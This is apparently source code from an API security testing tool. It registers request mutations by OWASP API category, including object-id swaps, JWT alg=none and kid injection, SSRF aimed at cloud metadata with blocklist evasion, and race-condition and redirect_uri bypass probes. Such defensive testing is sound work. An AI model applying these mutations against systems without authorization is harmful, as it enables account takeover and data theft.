_A = OwaspApiCategory

_HANDLERS: dict[str, tuple[MutationSpec, object]] = {}


def _register(spec: MutationSpec, handler) -> None:
    _HANDLERS[spec.kind] = (spec, handler)


for _spec, _handler in [
    # Verbatim replay — not tied to one OWASP category (the TestCase's own
    # owasp_category always comes from classify(), not from here); filed
    # under API1 only so the registry entry has somewhere to live.
    (MutationSpec("verbatim_replay", _A.API1, "Send the request exactly as extracted from a PoC — no attack transformation, for replaying an already-complete exploit"), _verbatim_replay),
    # API1
    (MutationSpec("swap_object_id", _A.API1, "Use another identity's object id in the path", needs_target_persona=True), _swap_object_id),
    (MutationSpec("swap_id_in_query", _A.API1, "Move the victim's object id into a query parameter", needs_target_persona=True), _swap_id_in_query),
    (MutationSpec("swap_id_in_header", _A.API1, "Scope the request to the victim via a client-supplied header", needs_target_persona=True), _swap_id_in_header),
    (MutationSpec("id_param_pollution", _A.API1, "Duplicate the id parameter with own + victim values", needs_target_persona=True), _id_param_pollution),
    (MutationSpec("wrap_id_array", _A.API1, "Wrap the id in an array to slip past scalar authorization checks", needs_target_persona=True), _wrap_id_array),
    (MutationSpec("swap_id_in_body", _A.API1, "Put the victim's object id in a request-body field", needs_target_persona=True), _swap_id_in_body),
    (MutationSpec("mutate_id_format", _A.API1, "Re-spell the object id (0, -1, me, *, case, padding, encoding) to confuse id handling", needs_target_persona=True), _mutate_id_format),
    (MutationSpec("content_type_switch", _A.API1, "Re-encode the body to bypass content-type-bound authorization"), _content_type_switch),
    # API2
    (MutationSpec("drop_auth", _A.API2, "Remove the credential entirely"), _drop_auth),
    (MutationSpec("tamper_token", _A.API2, "Replace the credential with a malformed token"), _tamper_token),
    (MutationSpec("jwt_alg_none", _A.API2, "Re-issue the JWT with alg=none and no signature"), _jwt_alg_none),
    (MutationSpec("jwt_alg_confusion", _A.API2, "Downgrade the JWT to HS256 signed with a weak key"), _jwt_alg_confusion),
    (MutationSpec("jwt_claim_tamper", _A.API2, "Rewrite JWT claims keeping the original signature"), _jwt_claim_tamper),
    (MutationSpec("jwt_expired_replay", _A.API2, "Replay the JWT with a long-past expiry"), _jwt_expired_replay),
    (MutationSpec("jwt_header_injection", _A.API2, "Add jku/x5u/jwk header parameters to the JWT keeping its signature"), _jwt_header_injection),
    (MutationSpec("jwt_kid_injection", _A.API2, "Inject a traversal payload into the JWT kid header"), _jwt_kid_injection),
    (MutationSpec("borrowed_token", _A.API2, "Present another persona's valid credential"), _borrowed_token),
    # API3
    (MutationSpec("inject_property", _A.API3, "Send object properties the caller must not set"), _inject_property),
    (MutationSpec("inject_nested_property", _A.API3, "Set a nested property an allowlist may not cover"), _inject_nested_property),
    # API4
    (MutationSpec("oversized_payload", _A.API4, "Inflate a field past any size limit"), _oversized_payload),
    (MutationSpec("pagination_abuse", _A.API4, "Request an unbounded page size"), _pagination_abuse),
    (MutationSpec("json_depth_bomb", _A.API4, "Send deeply nested JSON to probe parser cost"), _json_depth_bomb),
    (MutationSpec("rate_probe", _A.API4, "Repeat the request to detect missing rate limiting", multi_request=True), _rate_probe),
    (MutationSpec("graphql_batching_abuse", _A.API4, "Batch N GraphQL operations into one HTTP request to bypass per-request rate limiting"), _graphql_batching_abuse),
    # API5
    (MutationSpec("escalate_persona", _A.API5, "Invoke a privileged function as a low-privileged identity"), _escalate_persona),
    (MutationSpec("method_override", _A.API5, "Smuggle a privileged verb via an override header"), _method_override),
    (MutationSpec("method_switch", _A.API5, "Re-send the request with a different HTTP verb"), _method_switch),
    (MutationSpec("path_normalization_bypass", _A.API5, "Re-spell the route (case, //, /., trailing slash, matrix param) to slip past path-based access rules"), _path_normalization_bypass),
    (MutationSpec("admin_path_swap", _A.API5, "Re-aim the request at the administrative route"), _admin_path_swap),
    # API6
    (MutationSpec("repeat_flow", _A.API6, "Automate a sensitive business flow", multi_request=True), _repeat_flow),
    (MutationSpec("race_condition", _A.API6, "Fire concurrent requests at the check-to-commit window", multi_request=True), _race_condition),
    # API7
    (MutationSpec("ssrf_url", _A.API7, "Point a server-consumed URL at cloud metadata"), _ssrf_url),
    (MutationSpec("ssrf_url_bypass", _A.API7, "Same target, obfuscated to evade a string blocklist"), _ssrf_url_bypass),
    # API8
    (MutationSpec("cors_probe", _A.API8, "Test whether the CORS policy reflects arbitrary origins"), _cors_probe),
    (MutationSpec("debug_probe", _A.API8, "Request verbose/debug output"), _debug_probe),
    (MutationSpec("security_headers_probe", _A.API8, "Inspect response hardening headers"), _security_headers_probe),
    (MutationSpec("host_header_injection", _A.API8, "Test whether an absolute URL in the response trusts a client-supplied Host"), _host_header_injection),
    # API9
    (MutationSpec("version_downgrade", _A.API9, "Re-aim at a superseded API version"), _version_downgrade),
    (MutationSpec("undocumented_path_probe", _A.API9, "Probe for spec dumps / actuators / admin surfaces"), _undocumented_path_probe),
    (MutationSpec("graphql_introspection_probe", _A.API9, "Check whether GraphQL schema introspection is exposed"), _graphql_introspection_probe),
    # API10
    (MutationSpec("unsafe_redirect_url", _A.API10, "Test validation of third-party responses and redirects"), _unsafe_redirect_url),
    (MutationSpec("oauth_redirect_uri_bypass", _A.API10, "Test whether the OAuth authorization endpoint validates redirect_uri"), _oauth_redirect_uri_bypass),
]:
    _register(_spec, _handler)


MUTATION_KINDS: dict[str, MutationSpec] = {k: v[0] for k, v in _HANDLERS.items()}


def kinds_for(category: OwaspApiCategory) -> list[str]:
    return [k for k, spec in MUTATION_KINDS.items() if spec.category == category]


def apply_mutation(
    base: RequestSpec,
    mutation: Mutation,
    attacker: Persona,
    target: Persona | None,
    vault: PersonaVault,
    context: dict,
) -> PreparedRequest:
    entry = _HANDLERS.get(mutation.kind)
    if entry is None:
        raise MutationError(
            f"Unknown mutation kind: {mutation.kind!r}. Known kinds: {sorted(MUTATION_KINDS)}"
        )
    spec, handler = entry

    if spec.needs_target_persona and target is None:
        raise MutationError(
            f"Mutation '{spec.kind}' attacks another identity's object but the test "
            "declares no auth_context.target_persona."
        )

    req = _Req(
        method=base.method,
        path=base.path,
        # Attacker's own credentials are the default identity for the request;
        # anything the test spec sets explicitly wins over the persona default.
        headers={**attacker.auth_headers, **base.headers},
        query=dict(base.query),
        body=base.body,
    )
    env = _Env(attacker=attacker, target=target, vault=vault, context=context)

    try:
        handler(req, mutation, env)
    except jwt_tools.NotAJwt as exc:
        # Surfaced as a MutationError so it becomes a visible ERROR verdict
        # rather than an unmutated request masquerading as a passing test.
        raise MutationError(
            f"Mutation '{mutation.kind}' needs a JWT credential for persona "
            f"'{attacker.name}': {exc}"
        ) from exc

    return PreparedRequest(
        method=req.method,
        path=req.path,
        headers=req.headers,
        query=req.query,
        body=req.body,
        note=req.note,
        body_encoding=req.body_encoding,
        repeat=req.repeat,
        concurrent=req.concurrent,
    )
